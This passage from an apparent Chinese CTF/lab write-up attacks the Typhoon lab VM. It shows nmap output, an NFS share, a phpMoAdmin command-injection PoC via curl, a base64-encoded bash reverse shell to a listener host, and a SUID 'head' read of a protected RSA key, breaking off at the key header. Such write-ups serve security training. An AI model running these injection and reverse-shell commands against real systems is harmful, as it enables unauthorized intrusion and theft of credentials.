TLS_DHE_RSA_WITH_SEED_CBC_SHA<br>|             Modulus Type: Safe prime<br>|             Modulus Source: Unknown/Custom-generated<br>|             Modulus Length: 1024<br>|             Generator Length: 8<br>|             Public Key Length: 1024<br>|     References:<br>|_      https://weakdh.org<br>6379/tcp  open  redis<br>8080/tcp  open  http-proxy<br>| http-enum: <br>|   /examples/: Sample scripts<br>|   /manager/html/upload: Apache Tomcat (401 Unauthorized)<br>|   /manager/html: Apache Tomcat (401 Unauthorized)<br>|_  /docs/: Potentially interesting folder<br>27017/tcp open  mongod<br>34114/tcp open  unknown<br>34329/tcp open  unknown<br>41559/tcp open  unknown<br>43004/tcp open  unknown<br>49357/tcp open  unknown<br>MAC Address: 08:00:27:2D:C0:8F (Oracle VirtualBox virtual NIC)<br><br>Host script results:<br>|_smb-vuln-ms10-054: <span class="hljs-literal">false</span><br>|_smb-vuln-ms10-061: <span class="hljs-literal">false</span><br>| smb-vuln-regsvc-dos: <br>|   VULNERABLE:<br>|   Service regsvc <span class="hljs-keyword">in</span> Microsoft Windows systems vulnerable to denial of service<br>|     State: VULNERABLE<br>|       The service regsvc <span class="hljs-keyword">in</span> Microsoft Windows 2000 systems is vulnerable to denial of service caused by a null deference<br>|       pointer. This script will crash the service <span class="hljs-keyword">if</span> it is vulnerable. This vulnerability was discovered by Ron Bowes<br>|       <span class="hljs-keyword">while</span> working on smb-enum-sessions.<br>|_          <br><br>Nmap <span class="hljs-keyword">done</span>: 1 IP address (1 host up) scanned <span class="hljs-keyword">in</span> 333.29 seconds<br></code></pre></td></tr></table></figure><p>先从简单的开始尝试吧</p><h2 id="21-端口匿名登录"><a href="#21-端口匿名登录" class="headerlink" title="21 端口匿名登录"></a>21 端口匿名登录</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/typhoon]<br>└─$ ftp 192.168.56.121<br>Connected to 192.168.56.121.<br>220 (vsFTPd 3.0.2)<br>Name (192.168.56.121:kali): anonymous<br>331 Please specify the password.<br>Password: <br>230 Login successful.<br>Remote system <span class="hljs-built_in">type</span> is UNIX.<br>Using binary mode to transfer files.<br>ftp&gt; binary<br>200 Switching to Binary mode.<br>ftp&gt; <span class="hljs-built_in">ls</span> -liah<br>229 Entering Extended Passive Mode (|||6562|).<br>150 Here comes the directory listing.<br>drwxr-xr-x    2 0        129          4096 Oct 23  2018 .<br>drwxr-xr-x    2 0        129          4096 Oct 23  2018 ..<br>226 Directory send OK.<br></code></pre></td></tr></table></figure><p>没有文件，但或许可以上传？试一试</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs bash">ftp&gt; binary<br>200 Switching to Binary mode.<br>ftp&gt; put test.txt<br><span class="hljs-built_in">local</span>: test.txt remote: test.txt<br>229 Entering Extended Passive Mode (|||60611|).<br>553 Could not create file.<br></code></pre></td></tr></table></figure><p>不能创建文件，暂时没思路，看看别的端口</p><h2 id="2049-端口-nfs"><a href="#2049-端口-nfs" class="headerlink" title="2049 端口 nfs"></a>2049 端口 nfs</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/Downloads/typhoon]<br>└─$ showmount -e 192.168.56.121                 <br>Export list <span class="hljs-keyword">for</span> 192.168.56.121:<br>/typhoon *<br>┌──(kali㉿kali)-[~/Downloads/typhoon]<br>└─$ sudo mount -t nfs 192.168.56.121:/typhoon /tmp/infosec<br>┌──(kali㉿kali)-[/tmp/infosec]<br>└─$ <span class="hljs-built_in">ls</span> -liah<br>total 28K<br> 923939 drwxr-xr-x  2 root root 4.0K Oct 22  2018 .<br>4194305 drwxrwxrwt 17 root root  12K Jul  2 08:39 ..<br> 923940 -rw-r--r--  1 root root   24 Oct 22  2018 .secret<br> 923941 -rw-r--r--  1 root root   63 Oct 24  2018 secret<br> 923942 -rw-------  1 root root 1.8K Oct 22  2018 .secret.rsa<br></code></pre></td></tr></table></figure><p>目录下有三个文件，依次查看，不过 <code>.secret.rsa</code> 没有查看权限</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[/tmp/infosec]<br>└─$ <span class="hljs-built_in">cat</span> .secret    <br>belong to typhoon user.<br><br>┌──(kali㉿kali)-[/tmp/infosec]<br>└─$ <span class="hljs-built_in">cat</span> secret <br><span class="hljs-built_in">test</span> file<br>&lt;rec0nm4st3r&gt; R3c0n_m4steeeee3er_fl4g &lt;/rec0nm4st3r&gt;<br>┌──(kali㉿kali)-[/tmp/infosec]<br>└─$ <span class="hljs-built_in">cat</span> .secret.rsa <br><span class="hljs-built_in">cat</span>: .secret.rsa: Permission denied<br></code></pre></td></tr></table></figure><p>leet 网络用语，还原后得到 <code>recon_master_flag</code>，emmmm 看来只是个彩蛋。那看来 nfs 也没什么收获，这个权限有限的文件，等 getshell 后或许可以考虑。</p><h2 id="80-端口"><a href="#80-端口" class="headerlink" title="80 端口"></a>80 端口</h2><p>nmap 的扫描结果中，80 端口有个 robots.txt 文件，其中给了&#x2F;mongoadmin&#x2F;这样一个路径，看看吧</p><p><img src="/pic/ede0fe412ccfa5048136ba76eb19ea4a_MD5.png"></p><p>首页没什么东西，感觉是个广告，源码里也没收获。看看 mongoadmin 目录</p><p><img src="/pic/219f294b6eb93236b79f18011d8156e1_MD5.png"></p><p>似乎是个可视化的管理工具，点击 stats 得到如下的信息：</p><p><img src="/pic/b0c248169e8b56f98f95613301054fb0_MD5.png"></p><h2 id="phpMoAdmin-漏洞"><a href="#phpMoAdmin-漏洞" class="headerlink" title="phpMoAdmin 漏洞"></a>phpMoAdmin 漏洞</h2><p>里面给出了 <code>phpMoAdmin: 1.0.9</code>，搜一搜有没有漏洞</p><p><img src="/pic/710cea9afc74812a7e9849adb1a8ca21_MD5.png"></p><p>第一个链接给出了利用方法，这里只摘出 PoC</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl <span class="hljs-string">&quot;http://path.to/moadmin.php&quot;</span> -d <span class="hljs-string">&quot;object=1;system(&#x27;id&#x27;);exit&quot;</span><br></code></pre></td></tr></table></figure><p>接下来替换其中的命令尝试反弹 shell</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/tools]<br>└─$ curl <span class="hljs-string">&quot;http://192.168.56.121/mongoadmin/index.php&quot;</span> -d <span class="hljs-string">&quot;object=1;system(&#x27;cd /tmp;/bin/bash -c &quot;</span>bash -i &gt;&amp; /dev/tcp/192.168.56.106/4242 0&gt;&amp;1<span class="hljs-string">&quot;&#x27;);exit&quot;</span><br>zsh: no such file or directory: /dev/tcp/192.168.56.106/4242<br></code></pre></td></tr></table></figure><p>失败，应该是其中某些字符的问题，那就尝试 base64 编码再解码吧</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&#x27;/bin/bash -c &quot;bash -i &gt;&amp; /dev/tcp/192.168.56.106/4242 0&gt;&amp;1&quot;&#x27;</span> |<span class="hljs-built_in">base64</span><br>L2Jpbi9iYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNTYuMTA2LzQyNDIgMD4m<br>MSIK<br>                                                                                                                    <br>┌──(kali㉿kali)-[~]<br>└─$ <span class="hljs-built_in">echo</span> <span class="hljs-string">&quot;L2Jpbi9iYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNTYuMTA2LzQyNDIgMD4mMSIK&quot;</span> | <span class="hljs-built_in">base64</span> -d<br>/bin/bash -c <span class="hljs-string">&quot;bash -i &gt;&amp; /dev/tcp/192.168.56.106/4242 0&gt;&amp;1&quot;</span><br><br></code></pre></td></tr></table></figure><h2 id="base64编码以-getshell"><a href="#base64编码以-getshell" class="headerlink" title="base64编码以 getshell"></a>base64编码以 getshell</h2><p>将编码再解码的结果通过管道传递给 bash</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~/tools]<br>└─$ curl <span class="hljs-string">&quot;http://192.168.56.121/mongoadmin/index.php&quot;</span> -d <span class="hljs-string">&quot;object=1;system(&#x27;echo &quot;</span>L2Jpbi9iYXNoIC1jICJiYXNoIC1pID4mIC9kZXYvdGNwLzE5Mi4xNjguNTYuMTA2LzQyNDIgMD4mMSIK<span class="hljs-string">&quot; | base64 -d | bash&#x27;);exit&quot;</span><br></code></pre></td></tr></table></figure><p>提前开启监听，反弹 shell 成功</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs bash">┌──(kali㉿kali)-[~]<br>└─$ sudo nc -lvnp 4242<br>listening on [any] 4242 ...<br>connect to [192.168.56.106] from (UNKNOWN) [192.168.56.121] 53121<br>bash: cannot <span class="hljs-built_in">set</span> terminal process group (2151): Inappropriate ioctl <span class="hljs-keyword">for</span> device<br>bash: no job control <span class="hljs-keyword">in</span> this shell<br>www-data@typhoon:/var/www/html/mongoadmin$ <br>www-data@typhoon:/var/www/html/mongoadmin$ <span class="hljs-built_in">whoami</span><br><span class="hljs-built_in">whoami</span><br>www-data<br>www-data@typhoon:/var/www/html/mongoadmin$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>index.php<br>www-data@typhoon:/var/www/html/mongoadmin$ ip a  <br>ip a<br>1: lo: &lt;LOOPBACK,UP,LOWER_UP&gt; mtu 65536 qdisc noqueue state UNKNOWN group default <br>    <span class="hljs-built_in">link</span>/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00<br>    inet 127.0.0.1/8 scope host lo<br>       valid_lft forever preferred_lft forever<br>    inet6 ::1/128 scope host <br>       valid_lft forever preferred_lft forever<br>2: eth0: &lt;BROADCAST,MULTICAST,UP,LOWER_UP&gt; mtu 1500 qdisc pfifo_fast state UP group default qlen 1000<br>    <span class="hljs-built_in">link</span>/ether 08:00:27:2d:c0:8f brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.56.121/24 brd 192.168.56.255 scope global eth0<br>       valid_lft forever preferred_lft forever<br>    inet6 fe80::a00:27ff:fe2d:c08f/64 scope <span class="hljs-built_in">link</span> <br>       valid_lft forever preferred_lft forever<br>3: docker0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default <br>    <span class="hljs-built_in">link</span>/ether 02:42:bc:90:00:31 brd ff:ff:ff:ff:ff:ff<br>    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0<br>       valid_lft forever preferred_lft forever<br>4: virbr0: &lt;NO-CARRIER,BROADCAST,MULTICAST,UP&gt; mtu 1500 qdisc noqueue state DOWN group default <br>    <span class="hljs-built_in">link</span>/ether 8e:16:41:6c:32:c8 brd ff:ff:ff:ff:ff:ff<br>    inet 192.168.122.1/24 brd 192.168.122.255 scope global virbr0<br>       valid_lft forever preferred_lft forever<br>www-data@typhoon:/var/www/html/mongoadmin<span class="hljs-variable">$uname</span> -a<br><span class="hljs-built_in">uname</span> -a<br>Linux typhoon.local 3.13.0-32-generic <span class="hljs-comment">#57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux</span><br>www-data@typhoon:/var/www/html/mongoadmin$ python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;);&#x27;</span><br>&lt;tml/mongoadmin$ python -c <span class="hljs-string">&#x27;import pty;pty.spawn(&quot;/bin/bash&quot;);&#x27;</span>              <br>www-data@typhoon:/var/www/html/mongoadmin$ <span class="hljs-built_in">export</span> TERM=xterm-color<br><span class="hljs-built_in">export</span> TERM=xterm-color<br>www-data@typhoon:/var/www/html/mongoadmin$ <br></code></pre></td></tr></table></figure><h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><h3 id="基础信息收集"><a href="#基础信息收集" class="headerlink" title="基础信息收集"></a>基础信息收集</h3><p>进行信息收集，先看当前目录下的 index.php，确定没有敏感信息后，在系统中进行寻找</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@typhoon:/var/www/html/mongoadmin$ <span class="hljs-built_in">cat</span> /etc/passwd | grep bash<br><span class="hljs-built_in">cat</span> /etc/passwd | grep bash<br>root:x:0:0:root:/root:/bin/bash<br>postgres:x:111:121:PostgreSQL administrator,,,:/var/lib/postgresql:/bin/bash<br>typhoon:x:1000:1000:typhoon,,,:/home/typhoon:/bin/bash<br>admin:x:1001:1001:,,,:/home/admin:/bin/bash<br>postfixuser:x:1002:1002:,,,:/home/postfixuser:/bin/bash<br>www-data@typhoon:/var/www/html/mongoadmin$ <span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-built_in">cat</span> /etc/crontab<br><span class="hljs-comment"># /etc/crontab: system-wide crontab</span><br><span class="hljs-comment"># Unlike any other crontab you don&#x27;t have to run the `crontab&#x27;</span><br><span class="hljs-comment"># command to install the new version when you edit this file</span><br><span class="hljs-comment"># and files in /etc/cron.d. These files also have username fields,</span><br><span class="hljs-comment"># that none of the other crontabs do.</span><br><br>SHELL=/bin/sh<br>PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin<br><br><span class="hljs-comment"># m h dom mon dow user  command</span><br>17 *    * * *   root    <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.hourly<br>25 6    * * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.daily )<br>47 6    * * 7   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.weekly )<br>52 6    1 * *   root    <span class="hljs-built_in">test</span> -x /usr/sbin/anacron || ( <span class="hljs-built_in">cd</span> / &amp;&amp; run-parts --report /etc/cron.monthly )<br><span class="hljs-comment">#</span><br></code></pre></td></tr></table></figure><p>passwd 文件和 crontab 文件没什么收获</p><h3 id="home-目录信息收集"><a href="#home-目录信息收集" class="headerlink" title="home 目录信息收集"></a>home 目录信息收集</h3><p>进入 home 目录看看</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@typhoon:/home$ <span class="hljs-built_in">ls</span><br><span class="hljs-built_in">ls</span><br>admin  postfixuser  typhoon<br>www-data@typhoon:/home$ <span class="hljs-built_in">cd</span> admin<br><span class="hljs-built_in">cd</span> admin<br>www-data@typhoon:/home/admin$ <span class="hljs-built_in">ls</span> -liah<br><span class="hljs-built_in">ls</span> -liah<br>total 32K<br>917516 drwxr-xr-x 4 admin admin 4.0K Oct 22  2018 .<br>917505 drwxr-xr-x 5 root  root  4.0K Oct 23  2018 ..<br>917529 -rw------- 1 admin admin   40 Oct 25  2018 .bash_history<br>917518 -rw-r--r-- 1 admin admin  220 Oct 22  2018 .bash_logout<br>917517 -rw-r--r-- 1 admin admin 3.6K Oct 22  2018 .bashrc<br>917520 drwx------ 2 admin admin 4.0K Oct 22  2018 .cache<br>917519 -rw-r--r-- 1 admin admin  675 Oct 22  2018 .profile<br>917527 drwxr-xr-x 2 root  root  4.0K Oct 25  2018 .ssh<br>917522 -rw-r--r-- 1 admin admin    0 Oct 22  2018 .sudo_as_admin_successful<br>www-data@typhoon:/home/admin$ <span class="hljs-built_in">cd</span> .ssh<br><span class="hljs-built_in">cd</span> .ssh<br>www-data@typhoon:/home/admin/.ssh$ <span class="hljs-built_in">ls</span> -liah<br><span class="hljs-built_in">ls</span> -liah<br>total 12K<br>917527 drwxr-xr-x 2 root  root  4.0K Oct 25  2018 .<br>917516 drwxr-xr-x 4 admin admin 4.0K Oct 22  2018 ..<br>932596 -rw-r--r-- 1 admin admin   42 Oct 24  2018 secr3t<br>www-data@typhoon:/home/admin/.ssh$ <span class="hljs-built_in">cat</span> secr3t<br><span class="hljs-built_in">cat</span> secr3t<br>&lt;h0h0h0&gt;<br><br>ph00n_typ_p0st_flag!<br><br>&lt;/h0h0h0&gt;<br>www-data@typhoon:/home/admin/.ssh$ <span class="hljs-built_in">cd</span> ../../postfixuser<br><span class="hljs-built_in">cd</span> ../../postfixuser<br>www-data@typhoon:/home/postfixuser$ <span class="hljs-built_in">ls</span> -liah<br><span class="hljs-built_in">ls</span> -liah<br>total 20K<br>932184 drwxr-xr-x 2 postfixuser postfixuser 4.0K Oct 23  2018 .<br>917505 drwxr-xr-x 5 root        root        4.0K Oct 23  2018 ..<br>932186 -rw-r--r-- 1 postfixuser postfixuser  220 Oct 23  2018 .bash_logout<br>932185 -rw-r--r-- 1 postfixuser postfixuser 3.6K Oct 23  2018 .bashrc<br>932187 -rw-r--r-- 1 postfixuser postfixuser  675 Oct 23  2018 .profile<br>www-data@typhoon:/home/postfixuser$ <span class="hljs-built_in">cd</span> ../../typhoon<br><span class="hljs-built_in">cd</span> ../../typhoon<br>www-data@typhoon:/typhoon$ <span class="hljs-built_in">ls</span> -liah<br><span class="hljs-built_in">ls</span> -liah<br>total 20K<br>923939 drwxr-xr-x  2 root root 4.0K Oct 23  2018 .<br>     2 drwxr-xr-x 25 root root 4.0K Oct 24  2018 ..<br>923940 -rw-r--r--  1 root root   24 Oct 23  2018 .secret<br>923942 -rw-------  1 root root 1.8K Oct 23  2018 .secret.rsa<br>923941 -rw-r--r--  1 root root   63 Oct 24  2018 secret<br>www-data@typhoon:/typhoon$ <span class="hljs-built_in">cat</span> .secret.rsa<br><span class="hljs-built_in">cat</span> .secret.rsa<br><span class="hljs-built_in">cat</span>: .secret.rsa: Permission denied<br>www-data@typhoon:/typhoon$ <span class="hljs-built_in">cat</span> .secret<br><span class="hljs-built_in">cat</span> .secret<br>belong to typhoon user.<br>www-data@typhoon:/typhoon$ <span class="hljs-built_in">cat</span> secret<br><span class="hljs-built_in">cat</span> secret<br><span class="hljs-built_in">test</span> file<br>&lt;rec0nm4st3r&gt; R3c0n_m4steeeee3er_fl4g &lt;/rec0nm4st3r&gt;<br></code></pre></td></tr></table></figure><p>我们比较感兴趣的 <code>.secret.rsa</code> 文件没有读取权限，看看 s 权限文件有没有可以帮忙的</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@typhoon:/var/www/html/cms$ find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null<br>&lt;tml/cms$ find / -<span class="hljs-built_in">type</span> f -perm -04000 -<span class="hljs-built_in">ls</span> 2&gt;/dev/null                        <br> 14223   20 -rwsr-sr-x   1 libuuid  libuuid     18904 Jun  3  2014 /usr/sbin/uuidd<br> 14192  336 -rwsr-xr--   1 root     dip        343168 Jan 23  2013 /usr/sbin/pppd<br>   123   40 -rwsr-xr-x   1 root     root        39584 Mar 24  2014 /usr/bin/head<br>   184   32 -rwsr-xr-x   1 root     root        32464 Feb 17  2014 /usr/bin/newgrp<br>    44   44 -rwsr-xr-x   1 root     root        41336 Feb 17  2014 /usr/bin/chsh<br> 14475   16 -rwsr-xr-x   1 root     lpadmin     14336 Jul 18  2014 /usr/bin/lppasswd<br> 14407   24 -rwsr-xr-x   1 root     root        23304 Feb 11  2014 /usr/bin/pkexec<br>    41   48 -rwsr-xr-x   1 root     root        46424 Feb 17  2014 /usr/bin/chfn<br> 14283   52 -rwsr-sr-x   1 daemon   daemon      51464 Oct 21  2013 /usr/bin/at<br>   115   68 -rwsr-xr-x   1 root     root        68152 Feb 17  2014 /usr/bin/gpasswd<br>   196   48 -rwsr-xr-x   1 root     root        47032 Feb 17  2014 /usr/bin/passwd<br> 14168   76 -rwsr-xr-x   1 root     root        75256 Oct 21  2013 /usr/bin/mtr<br>   302  152 -rwsr-xr-x   1 root     root       155008 Feb 10  2014 /usr/bin/sudo<br> 14642   88 -rwsr-sr-x   1 root     mail        89216 Oct 21  2013 /usr/bin/procmail<br> 14691 2144 -rwsr-xr-x   1 root     root      2191736 Jan  2  2014 /usr/bin/vim.basic<br> 14141   24 -rwsr-xr-x   1 root     root        23104 May  8  2014 /usr/bin/traceroute6.iputils<br>  1023   12 -rwsr-xr-x   1 root     root        10344 Apr 12  2014 /usr/lib/pt_chown<br>144019  432 -rwsr-xr-x   1 root     root       440416 May 12  2014 /usr/lib/openssh/ssh-keysign<br>532019   12 -rwsr-xr-x   1 root     root        10528 Jun 11  2012 /usr/lib/authbind/helper<br>270214   16 -rwsr-xr-x   1 root     root        14768 Feb 11  2014 /usr/lib/policykit-1/polkit-agent-helper-1<br> 12275  304 -rwsr-xr--   1 root     messagebus   310800 Jul  3  2014 /usr/lib/dbus-1.0/dbus-daemon-launch-helper<br>   392   12 -rwsr-xr-x   1 root     root        10240 Feb 25  2014 /usr/lib/eject/dmcrypt-get-device<br>790141   36 -rwsr-xr-x   1 root     root        35608 Jun 28  2013 /sbin/mount.cifs<br>804667   92 -rwsr-xr-x   1 root     root        94168 Nov  6  2015 /sbin/mount.nfs<br>658417   32 -rwsr-xr-x   1 root     root        30800 Dec 16  2013 /bin/fusermount<br>655433   44 -rwsr-xr-x   1 root     root        44680 May  8  2014 /bin/ping6<br>655419   96 -rwsr-xr-x   1 root     root        94792 Jun  3  2014 /bin/mount<br>655432   44 -rwsr-xr-x   1 root     root        44168 May  8  2014 /bin/ping<br>655452   40 -rwsr-xr-x   1 root     root        36936 Feb 17  2014 /bin/su<br>655460   68 -rwsr-xr-x   1 root     root        69120 Jun  3  2014 /bin/umount<br></code></pre></td></tr></table></figure><h3 id="head-文件-SUID-任意文件读取-ssh-密钥"><a href="#head-文件-SUID-任意文件读取-ssh-密钥" class="headerlink" title="head 文件 SUID 任意文件读取 ssh 密钥"></a>head 文件 SUID 任意文件读取 ssh 密钥</h3><p>head 文件具有 s 权限，根据 gtfobins 可以实现任意文件读取</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><code class="hljs bash">www-data@typhoon:/typhoon$ <span class="hljs-built_in">head</span> -c1G .secret.rsa<br><span class="hljs-built_in">head</span> -c1G .secret.rsa<br>-----BEGIN RSA PRIVATE KEY-----<br>Proc-Type: 4,ENCRYPTED<br>DEK-Info: 